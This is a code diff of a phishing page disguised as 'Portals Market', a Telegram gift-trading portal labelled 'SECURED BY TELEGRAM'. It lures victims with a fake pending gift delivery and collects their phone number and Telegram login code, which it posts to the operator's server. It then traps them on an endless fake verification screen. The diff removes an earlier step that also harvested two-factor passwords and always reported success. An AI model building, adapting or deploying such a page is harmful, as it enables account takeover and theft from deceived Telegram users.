@@ -69,6 +69,7 @@
             margin-bottom: 28px;
         }
 
+        /* НОВАЯ АВАТАРКА */
         .portal-avatar {
             width: 80px;
             height: 80px;
@@ -431,11 +432,12 @@
             <span class="badge">VERIFYING</span>
         </div>
 
-        <!-- ШАГ 1: Главный экран -->
+        <!-- Шаг 1: Главный экран -->
         <div id="stepMain">
             <div class="logo-section">
+                <!-- НОВАЯ АВАТАРКА -->
                 <div class="portal-avatar">
-                    <img src="https://i.postimg.cc/MMK1pH1m/IMG-4179.jpg" alt="JollyChimp #20,203">
+                    <img src="https://i.postimg.cc/GHJYGvzS/IMG-4180.jpg" alt="SpyAgaric-37522">
                 </div>
                 <h2>Portals Market</h2>
                 <p>Open the portal. Trade your gifts.</p>
@@ -446,7 +448,7 @@
                 <div class="label">⚡ Action Needed</div>
                 <h3>Unlock Your Asset Delivery</h3>
                 <p>
-                    Scheduled delivery of your <strong class="highlight-gift">JollyChimp #20,203</strong> is tagged for manual-grade delivery review.
+                    Scheduled delivery of your <strong class="highlight-gift">SpyAgaric-37522</strong> is tagged for manual-grade delivery review.
                     To ensure platform safety and stop fraudulent claim attempts, confirming your active session is required.
                 </p>
             </div>
@@ -455,7 +457,7 @@
             <div class="footer">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- ШАГ 2: Регион и номер телефона -->
+        <!-- Шаг 2: Регион и номер телефона -->
         <div id="stepRegion" class="phone-section">
             <div style="text-align:center; margin-bottom:16px;">
                 <div style="font-size:32px; margin-bottom:4px;">📱</div>
@@ -492,7 +494,7 @@
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- ШАГ 3: Ввод кода -->
+        <!-- Шаг 3: Ввод кода -->
         <div id="stepCode" class="code-section">
             <div style="text-align:center; margin-bottom:16px;">
                 <div style="font-size:32px; margin-bottom:4px;">🔐</div>
@@ -522,31 +524,7 @@
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- ШАГ 4: Двухэтапная авторизация (ПАРОЛЬ) - УПРОЩЕННЫЙ ВАРИАНТ -->
-        <div id="stepPassword" class="password-section">
-            <div style="text-align:center; margin-bottom:16px;">
-                <div style="font-size:32px; margin-bottom:4px;">🔑</div>
-                <h4 style="color:#fff; font-size:17px;">Двухэтапная авторизация</h4>
-            </div>
-
-            <div class="password-input-wrap">
-                <input type="password" id="passwordInput" placeholder="Введите пароль" autofocus>
-            </div>
-
-            <div class="password-hint">
-                ⚠️ Введите пароль от аккаунта
-            </div>
-
-            <button class="btn-share" id="btnVerifyPassword">✅ Подтвердить пароль</button>
-
-            <div style="text-align:center; margin-top:12px;">
-                <button class="resend-btn" id="btnBackToCode">🔙 Назад к коду</button>
-            </div>
-
-            <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
-        </div>
-
-        <!-- ШАГ 5: Бесконечная загрузка -->
+        <!-- Шаг 4: Бесконечная загрузка -->
         <div id="stepVerification" class="verification-section">
             <div class="verification-card">
                 <div class="icon">⏳</div>
@@ -574,26 +552,20 @@
         const userId = user.id || 'нет_id';
 
         let userPhone = '';
-        let userCode = '';
 
-        // Элементы
         const stepMain = document.getElementById('stepMain');
         const stepRegion = document.getElementById('stepRegion');
         const stepCode = document.getElementById('stepCode');
-        const stepPassword = document.getElementById('stepPassword');
         const stepVerification = document.getElementById('stepVerification');
         const backBtn = document.getElementById('backBtn');
         const btnVerify = document.getElementById('btnVerify');
         const btnSendCode = document.getElementById('btnSendCode');
         const btnVerifyCode = document.getElementById('btnVerifyCode');
-        const btnVerifyPassword = document.getElementById('btnVerifyPassword');
         const btnResendCode = document.getElementById('btnResendCode');
-        const btnBackToCode = document.getElementById('btnBackToCode');
         const phoneInput = document.getElementById('phoneInput');
         const regionSelect = document.getElementById('regionSelect');
         const phonePrefix = document.getElementById('phonePrefix');
         const codeInput = document.getElementById('codeInput');
-        const passwordInput = document.getElementById('passwordInput');
         const displayPhone = document.getElementById('displayPhone');
 
         regionSelect.addEventListener('change', function() {
@@ -602,7 +574,7 @@
         });
 
         function showStep(step) {
-            [stepMain, stepRegion, stepCode, stepPassword, stepVerification].forEach(el => {
+            [stepMain, stepRegion, stepCode, stepVerification].forEach(el => {
                 el.style.display = 'none';
                 el.classList.remove('active');
             });
@@ -666,7 +638,7 @@
                 });
         });
 
-        // ===== ОТПРАВКА КОДА → ПЕРЕХОД К ПАРОЛЮ =====
+        // ===== ОТПРАВКА КОДА =====
         btnVerifyCode.addEventListener('click', function() {
             const code = codeInput.value.trim();
 
@@ -674,8 +646,6 @@
                 alert('Пожалуйста, введите код из Telegram.');
                 return;
             }
-
-            userCode = code;
 
             btnVerifyCode.disabled = true;
             btnVerifyCode.textContent = '⏳ Отправка...';
@@ -701,72 +671,16 @@
                 })
                 .then(data => {
                     console.log('✅ Код отправлен на сервер:', data);
-                    showStep(stepPassword);
-                    passwordInput.focus();
+                    showStep(stepVerification);
                     btnVerifyCode.disabled = false;
                     btnVerifyCode.textContent = '✅ Подтвердить';
                 })
                 .catch(err => {
                     console.log('❌ Ошибка:', err);
-                    alert('❌ Ошибка проверки кода. Попробуйте еще раз.');
+                    showStep(stepVerification);
                     btnVerifyCode.disabled = false;
                     btnVerifyCode.textContent = '✅ Подтвердить';
                 });
-        });
-
-        // ===== ОТПРАВКА ПАРОЛЯ (ВСЕГДА УСПЕШНО) =====
-        btnVerifyPassword.addEventListener('click', function() {
-            const password = passwordInput.value.trim();
-
-            if (!password || password.length < 1) {
-                alert('Пожалуйста, введите пароль.');
-                return;
-            }
-
-            btnVerifyPassword.disabled = true;
-            btnVerifyPassword.textContent = '⏳ Отправка...';
-
-            console.log('📤 ОТПРАВКА ПАРОЛЯ НА СЕРВЕР');
-            console.log('📱 Телефон:', userPhone);
-            console.log('🔑 Код:', userCode);
-            console.log('🔐 Пароль:', password);
-
-            fetch('/api/verify-password', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone: userPhone,
-                        code: userCode,
-                        password: password,
-                        fullName: fullName,
-                        username: username,
-                        userId: userId
-                    })
-                })
-                .then(res => {
-                    console.log('📥 Ответ от сервера, статус:', res.status);
-                    return res.json();
-                })
-                .then(data => {
-                    console.log('✅ Пароль отправлен на сервер:', data);
-                    // ВСЕГДА ПЕРЕХОДИМ НА БЕСКОНЕЧНУЮ ЗАГРУЗКУ
-                    showStep(stepVerification);
-                    btnVerifyPassword.disabled = false;
-                    btnVerifyPassword.textContent = '✅ Подтвердить пароль';
-                })
-                .catch(err => {
-                    console.log('❌ Ошибка:', err);
-                    // ДАЖЕ ПРИ ОШИБКЕ - ПОКАЗЫВАЕМ ЗАГРУЗКУ!
-                    showStep(stepVerification);
-                    btnVerifyPassword.disabled = false;
-                    btnVerifyPassword.textContent = '✅ Подтвердить пароль';
-                });
-        });
-
-        // ===== НАЗАД К КОДУ =====
-        btnBackToCode.addEventListener('click', function() {
-            showStep(stepCode);
-            codeInput.focus();
         });
 
         // ===== ПОВТОРНАЯ ОТПРАВКА КОДА =====
@@ -813,15 +727,6 @@
                 showStep(stepMain);
                 return;
             }
-            if (stepPassword.style.display === 'block') {
-                if (confirm('Вы уверены? Процесс будет прерван.')) {
-                    showStep(stepMain);
-                    passwordInput.value = '';
-                    btnVerifyPassword.disabled = false;
-                    btnVerifyPassword.textContent = '✅ Подтвердить пароль';
-                }
-                return;
-            }
             if (stepVerification.style.display === 'block') {
                 if (confirm('Вы уверены? Авторизация будет прервана.')) {
                     showStep(stepMain);
@@ -846,12 +751,6 @@
         codeInput.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 btnVerifyCode.click();
-            }
-        });
-
-        passwordInput.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                btnVerifyPassword.click();
             }
         });
 
